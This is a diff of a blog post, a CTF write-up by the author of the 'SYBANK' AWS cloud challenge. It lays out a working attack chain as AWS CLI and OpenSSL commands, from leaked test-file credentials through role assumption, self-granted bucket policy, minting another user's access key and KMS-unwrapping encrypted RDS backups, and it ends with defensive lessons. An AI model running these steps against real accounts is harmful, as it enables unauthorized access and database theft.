@@ -1,35 +1,35 @@
 ---
-title: "SYBank — how a key in a test file cost them the whole database"
+title: "PwnSec 2k26 - [Cloud] SYBANK"
 date: 2026-09-13
 draft: false
-description: "A PwnSec CTF chain: a leaked AWS key in a test file leads to role assumption, S3 bucket-policy abuse, a recovered Vim swap file, and envelope-encrypted RDS backups decrypted straight through KMS."
+description: "The cloud challenge I wrote for PwnSec 2k26: a key leaked in a test file, a trust policy anyone could walk through, bucket-policy self-service, a forgotten Vim swap file, and RDS backups whose reader could also unwrap the key."
 tags: ["ctf", "cloud", "aws"]
 ---
 
-I don't usually go this deep on the cloud challenges. Most are either "we hid a flag in an S3 bucket, go find it" or a rabbit hole that needs three IAM PhDs. This one was different: a proper chain, the kind of thing that actually happens at work. Every step was a real mistake I've either caught in a review or, honestly, almost made myself.
+Most cloud challenges land in one of two buckets. Either the flag is sitting in a public S3 object and you're done in four minutes, or the path runs so deep into IAM trivia that nobody finishes. I wanted SYBANK somewhere in between: a chain where every link is a mistake I've seen in a real account, stacked until they add up to the whole database.
 
-So here's how it went. Endpoint for the whole thing was a hosted AWS-compatible box:
+Six links. Break any one and the chain dies. That was the design goal, and it's also the lesson I wanted people to leave with.
+
+Everything runs against a hosted AWS-compatible endpoint, so players set this once:
 
 ```bash
 # export AWS_ENDPOINT_URL="https://localhost:8888"   # only if you're running LocalStack yourself
 export AWS_ENDPOINT_URL="https://28abecb4e9659ba9.chal.ctf.ae"
 ```
 
-Set that once and every `aws` command talks to the challenge instead of a real account. Forget it and your commands hit actual AWS and get denied. Ask me how I know.
+With that exported, every `aws` command talks to the challenge instead of a real account. Skip it and the commands go to actual AWS and get denied, which is a confusing way to lose ten minutes.
 
-## Part 1 — finding the way in
+## Link 1: the key in the test file
 
-No creds to start with, just a company name and a person. Classic. An OSINT warm-up before you get to touch anything cloudy.
+Players start with a company name and a person. No credentials, no endpoint access, nothing to authenticate with, so the opening move has to be OSINT.
 
-Found the guy's LinkedIn first and read the bio properly, since people always slip something in there: a personal site, a handle, whatever. This one dropped a username, `blvkrose`. That's a thread to pull.
-
-Ran sherlock on it to see where else it lived:
+The person's LinkedIn bio carries a username, `blvkrose`. Bios are where people leak handles without thinking about it, which is exactly why I put it there. Run the handle through sherlock and GitHub comes back:
 
 ```bash
 sherlock blvkrose
 ```
 
-GitHub came back, which is what I was hoping for. I almost went straight for the app code first, which wasted ten minutes. The gold was in the tests. It nearly always is. Somebody needed their integration test to actually talk to S3, hardcoded a real key "temporarily," and git remembered it forever:
+The repo is public. The trap is *where* the credential lives: not in the application code, but in the tests.
 
 ```python
 # tucked into one of the tests/test_*.py files
@@ -37,28 +37,28 @@ AWS_ACCESS_KEY_ID     = "AKIA................"
 AWS_SECRET_ACCESS_KEY = "................................"
 ```
 
-I've done a version of this myself. Not pushed it, thank god, but I've had a real key sitting in a local test file for way too long. It's an easy trap. Tests are code, the repo is public, and a string that looks like a credential is a credential to anyone reading.
+Somebody needed an integration test to actually talk to S3, hardcoded a real key "temporarily," and git kept it forever. This is link one because I've done a version of it myself. Never pushed it, thank god, but I've had a live key sitting in a local test file far longer than I'd like to admit. Tests are code. The repo is public. A string that looks like a credential is a credential to whoever reads it.
 
-That's our foothold.
+That's the foothold.
 
-## Part 2 — okay, who am I?
+## Link 2: the trust policy anyone can walk through
 
-First move with any AWS key, always:
+First move with any AWS key:
 
 ```bash
-aws configure                 # pasted the leaked AKIA key + secret
+aws configure                 # the leaked AKIA key + secret
 aws sts get-caller-identity
 ```
 
-`get-caller-identity` is my `whoami` for AWS, and it can't lie: if the key's valid, it hands you the account ID and exactly which principal you are. Turned out to be some low-level dev identity, not exciting on its own.
+`get-caller-identity` is the AWS equivalent of `whoami` and it can't be denied. A valid key hands back the account ID and exactly which principal you are. Here it resolves to a low-privilege dev identity, which is deliberately boring.
 
-The interesting part with a boring identity is always what it can turn into. So I listed roles:
+The interesting question with a boring identity is what it can turn into:
 
 ```bash
 aws iam list-roles
 ```
 
-And there it is: `assumeRole-dba`. Roles are supposed to be assumable only by trusted principals, but a loose trust policy just lets you walk in.
+`assumeRole-dba` shows up. Roles are only supposed to be assumable by the principals their trust policy names, and I wrote that trust policy wide open on purpose:
 
 ```bash
 aws sts assume-role \
@@ -66,26 +66,28 @@ aws sts assume-role \
   --role-session-name dba
 ```
 
-That spits back temporary creds: access key, secret, session token. Lateral movement, cloud-style — same account, bigger badge. I stashed it as a profile so I could hop between identities without losing my mind:
+Back come temporary credentials: access key, secret, session token. Same account, bigger badge. Stash them as a profile so you can move between identities without losing track of which one you're holding:
 
 ```bash
-aws configure --profile dba          # pasted the assume-role output, session token included
+aws configure --profile dba          # the assume-role output, session token included
 aws sts get-caller-identity --profile dba
 aws --profile dba s3 ls
 ```
 
-Two buckets worth caring about:
+Two buckets matter:
 
 ```bash
 aws --profile dba s3 ls s3://sybank-dev-s3rdsbackupfiles   # encrypted RDS backups
 aws --profile dba s3 ls s3://sybank-dev-s3filesharing      # has a .automation.sh.swp
 ```
 
-That `.automation.sh.swp` made me grin. It's a Vim swap file. Every time you open a file in Vim it drops a hidden `.<name>.swp` next to it holding the buffer, so a leftover `.swp` is basically a snapshot of whatever someone was editing. Here, an `automation.sh`. It usually still has the plaintext the real script was hiding.
+## Link 3: bucket-policy self-service
 
-Problem: I could list it as dba but couldn't `GetObject` it. Denied. Sat there annoyed for a second, then remembered dba could touch the bucket policy.
+That `.automation.sh.swp` is the piece I had the most fun planting. It's a Vim swap file. Open a file in Vim and it drops a hidden `.<name>.swp` beside it holding the buffer, so a leftover swap file is a snapshot of whatever someone was editing, usually including the plaintext the finished script was careful to hide.
 
-If you can't read the object but you can rewrite the bucket's resource policy, you just grant yourself the read. That's it. dba had `s3:PutBucketPolicy`, so:
+dba can list that object but not `GetObject` it. That's the intended wall, and it's meant to look final for a moment.
+
+It isn't, because dba holds `s3:PutBucketPolicy`. If you can't read the object but you can rewrite the bucket's resource policy, you grant yourself the read:
 
 ```bash
 aws --profile dba s3api put-bucket-policy \
@@ -101,23 +103,23 @@ aws --profile dba s3api put-bucket-policy \
   }'
 ```
 
-This bites people in the real world constantly. Access in S3 is identity policy OR resource policy, either one is enough. So `s3:PutBucketPolicy` isn't "manage a setting." It's effectively "read and write everything in this bucket," because whoever holds it can just author themselves the permission. I've flagged this exact thing in a review before and watched someone go "wait, that's it?" Yeah. That's it.
+This is the link I most wanted people to remember. S3 access is identity policy OR resource policy, and either one is enough on its own. So `s3:PutBucketPolicy` isn't "can adjust a setting." It's "can read and write everything in this bucket," because whoever holds it writes themselves the permission. I've flagged this in a review and watched the room go quiet for a second. Yeah. That's it.
 
-Grabbed the file:
+Pull the file:
 
 ```bash
 aws --profile dba s3 cp s3://sybank-dev-s3filesharing/.automation.sh.swp .
 ```
 
-Recovered the text. `vim -r .automation.sh.swp` works, but `strings` on it was enough to read what mattered. The script referenced a second IAM user, `dba-sec`, and dba was allowed to manage it. Which means I didn't need that user's password or existing keys. I just minted a fresh one:
+`vim -r .automation.sh.swp` recovers it properly, though `strings` gets you to the useful part just as fast. The recovered script references a second IAM user, `dba-sec`, and dba is allowed to manage that user. No password needed, no existing key needed. Just mint a fresh one:
 
 ```bash
 aws iam create-access-key --user-name dba-sec --profile dba
 ```
 
-`iam:CreateAccessKey` on another user is game over for that user. You can always print yourself a working key for them. Favorite persistence trick for a reason.
+`iam:CreateAccessKey` on another user is total ownership of that user. You can always print yourself working credentials for them, which is why it shows up in so many persistence writeups.
 
-## Part 3 — becoming sec and grabbing the backups
+## Link 4: the backup reader who can also unwrap the key
 
 New key, new profile:
 
@@ -126,16 +128,16 @@ aws configure --profile sec
 aws sts get-caller-identity --profile sec
 ```
 
-`sec` was more locked down than dba, and a plain `s3 ls` died on the spot:
+`sec` is scoped tighter than dba. A plain `s3 ls` dies immediately:
 
 ```bash
 aws --profile sec s3 ls                                       # AccessDenied
 aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles      # this works though
 ```
 
-Fine, that's least-privilege doing its job. sec only has rights on the backups bucket, and that's the bucket I wanted anyway.
+That's least privilege working correctly, and I left it that way deliberately. sec only has rights on the backups bucket, which happens to be the bucket that matters.
 
-The backups sit in timestamped folders. Listed one and looped over it to pull everything down:
+Backups sit in timestamped folders, so list one and loop over it:
 
 ```bash
 for i in $(aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/ | awk '{print $4}'); do
@@ -143,24 +145,26 @@ for i in $(aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles/dumps/202609
 done
 ```
 
-Quick note to save you the headache I gave myself: list and copy from the same timestamp. I fat-fingered mine, listed `...194858/` but copied from `...123006/`, then sat there wondering why nothing downloaded. Nothing was broken. I was just pointing at two different folders. Keep them the same.
+If nothing downloads here, check that the timestamp you listed matches the one you're copying from. Pointing those at two different folders produces silence rather than an error, and silence is miserable to debug.
 
-Each dump folder had three files:
+Each folder holds three files:
 
 - `sy_internal_<ts>.keyblob.b64`: the data key, itself encrypted by KMS, base64'd
-- `sy_internal_<ts>.globals.sql.enc`: Postgres roles/users, OpenSSL-encrypted
+- `sy_internal_<ts>.globals.sql.enc`: Postgres roles and users, OpenSSL-encrypted
 - `sy_internal_<ts>.dump.enc`: the actual `pg_dump`, OpenSSL-encrypted
 
-Textbook envelope encryption, the AWS backup pattern. The data gets encrypted with a random symmetric key, and that key gets wrapped by a KMS master key and dropped next to the data as the "key blob." So to read anything you first have to ask KMS to unwrap the key.
+That's textbook envelope encryption, the same pattern AWS backups use. The data gets encrypted with a random symmetric key, that key gets wrapped by a KMS master key, and the wrapped blob is dropped next to the data. Reading anything means asking KMS to unwrap the key first.
 
-And here's the whole point of the challenge: sec can read the backups, and sec can also call `kms:Decrypt`. So the encryption buys them nothing. I just asked KMS nicely:
+Which is the whole point of this link: sec can read the backups, and sec can also call `kms:Decrypt`. The encryption buys the defender nothing, because the same identity holds both halves.
 
 ```bash
 aws --profile sec kms decrypt \
   --ciphertext-blob file://sy_internal_20260911_161409.keyblob.b64
 ```
 
-The `Plaintext` in the response was the data key: `+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U=`. That base64 string is literally the passphrase the dumps were encrypted with. So OpenSSL, matching how they were encrypted (AES-256-CBC, PBKDF2):
+The `Plaintext` field comes back as `+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U=`. That base64 string is the passphrase the dumps were encrypted with.
+
+Decrypt both files with OpenSSL, matching how they were encrypted (AES-256-CBC, PBKDF2):
 
 ```bash
 openssl enc -d -aes-256-cbc -pbkdf2 \
@@ -172,20 +176,20 @@ openssl enc -d -aes-256-cbc -pbkdf2 \
   -in sy_internal_20260911_161409.dump.enc -out dump
 ```
 
-The crypto here is completely fine, by the way. Nothing was broken. The mistake sits in the permissions around the key: the exact same identity that can pull the encrypted backup can also decrypt the key that protects it. Split those two and this step is dead. That's the line I'd write in the postmortem.
+Worth being clear about what's broken here: nothing, cryptographically. The algorithms are fine, the key wrapping is fine. The mistake is entirely in the permissions around the key, where one identity can both pull the encrypted backup and decrypt the key protecting it. Split those two grants and this link is dead.
 
-While I was in there, sec could also read Secrets Manager, so I checked it for DB creds:
+sec can also read Secrets Manager, which holds the database connection details:
 
 ```bash
 aws --profile sec secretsmanager list-secrets --region us-east-1
 aws --profile sec secretsmanager get-secret-value --secret-id dbsec/database --region us-east-1
 ```
 
-Watch the syntax. The name goes in `--secret-id`, `--region` is a flag. I typo'd this two different ways before it worked. `dbsec/database` held the connection details, confirming what I was about to restore anyway.
+The secret name goes in `--secret-id` and `--region` stays a flag; getting that syntax backwards is a common way to waste a few minutes here.
 
-## Part 4 — restore it and read the flag
+## Link 5: restore it and read the flag
 
-The dump is a normal `pg_dump` custom-format archive, so the easiest path is spinning up a throwaway Postgres and restoring into it:
+The dump is a standard `pg_dump` custom-format archive, so the intended finish is a throwaway Postgres container:
 
 ```bash
 docker run -d \
@@ -196,9 +200,9 @@ docker run -d \
   postgres:latest
 ```
 
-Two things I tripped on: don't drop the `\` before `postgres:latest` (skip it and the volume line eats the image name), and `-v ./db:/tmp` means my local `./db` shows up as `/tmp` in the container. So `globals` and `dump` went into `./db`, landing at `/tmp/globals` and `/tmp/dump` inside.
+`-v ./db:/tmp` maps the local `./db` directory to `/tmp` inside the container, so `globals` and `dump` go in `./db` and land at `/tmp/globals` and `/tmp/dump`.
 
-Then shell in and restore in order. Globals first, since they create the roles the dump expects to own things. Skip that step and `pg_restore` throws a wall of "role does not exist" warnings.
+Restore in order. Globals first, since they create the roles the dump expects to own things; skip that and `pg_restore` produces a wall of "role does not exist" warnings.
 
 ```bash
 docker exec -it postgres bash
@@ -209,26 +213,28 @@ pg_restore -U postgres -d sy_internal --clean --if-exists /tmp/dump
 psql -U postgres -d sy_internal           # poke around
 ```
 
-From there it's just SQL:
+From there it's plain SQL:
 
 ```sql
 \dt
 SELECT * FROM <the table that obviously holds it>;
 ```
 
-Flag was sitting in one of the restored tables. `CTF{...}`.
+The flag sits in one of the restored tables. `CTF{...}`.
 
-## Looking back
+## Why I built it this way
 
-What I like about this one: there's no single "hack." It's six small, boring, realistic mistakes stacked on top of each other.
+There's no clever single trick in SYBANK. It's six small, boring, entirely realistic mistakes stacked on each other:
 
 1. A live key committed into a test file.
 2. A role almost anyone could assume.
-3. `s3:PutBucketPolicy` handed out like it's harmless. It is not.
+3. `s3:PutBucketPolicy` handed out as though it were harmless. It is not.
 4. An editor swap file left in shared storage, plus `iam:CreateAccessKey` on another user.
 5. The backup reader also holding `kms:Decrypt`.
-6. The reminder that a recoverable backup is just plaintext with extra steps.
+6. A recoverable backup, which is just plaintext with extra steps.
 
-Break any one link and the chain snaps. You don't defend against "the attack." You defend against each little link. Scan for secrets before you push. Scope your trust policies tightly. Treat `PutBucketPolicy` and `CreateAccessKey` as admin, because they are. Keep temp files out of buckets. And don't let the same role read the backup and unwrap its key.
+Each one on its own gets waved through code review. Together they hand over the database.
 
-Good challenge. Would've saved myself fifteen minutes reading the tests first and matching my folder timestamps, but that's CTFs for you.
+That's the part I wanted players to sit with. You don't defend against "the attack," you defend each link: scan for secrets before they're pushed, scope trust policies to named principals, treat `PutBucketPolicy` and `CreateAccessKey` as the admin permissions they actually are, keep editor temp files out of shared buckets, and never let one identity both read a backup and unwrap its key.
+
+Thanks to everyone who played it.
